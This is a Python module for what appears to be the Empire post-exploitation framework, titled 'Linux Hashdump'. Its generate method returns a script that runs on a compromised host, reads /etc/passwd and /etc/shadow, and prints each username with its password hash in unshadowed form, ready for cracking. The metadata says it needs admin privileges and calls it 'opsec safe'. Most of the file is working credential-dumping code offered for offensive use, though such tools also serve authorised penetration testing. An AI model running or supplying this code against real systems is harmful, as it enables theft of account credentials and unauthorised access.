from lib.common import helpers
import pdb

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            # name for the module that will appear in module menus
            'Name': 'Linux Hashdump',

            # list of one or more authors for the module
            'Author': ['@harmj0y'],

            # more verbose multi-line description of the module
            'Description': ("Extracts the /etc/passwd and /etc/shadow, unshadowing the result."),

            # True if the module needs to run in the background
            'Background' : False,

            # File extension to save the file as
            'OutputExtension' : "",

            # if the module needs administrative privileges
            'NeedsAdmin' : True,

            # True if the method doesn't touch disk/is reasonably opsec safe
            'OpsecSafe' : True,

            # the module language
            'Language' : 'python',

            # the minimum language version needed
            'MinLanguageVersion' : '2.6',

            # list of any references/other comments
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute module on.',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

        script = """
f = open("/etc/passwd")
passwd = f.readlines()
f.close()

f2 = open("/etc/shadow")
shadow = f2.readlines()
f2.close()

users = {}

for line in shadow:
    parts = line.strip().split(":")
    username, pwdhash = parts[0], parts[1]
    users[username] = pwdhash

for line in passwd:
    parts = line.strip().split(":")
    username = parts[0]
    info = ":".join(parts[2:])
    if username in users:
        print "%s:%s:%s" %(username, users[username], info)
"""

        return script
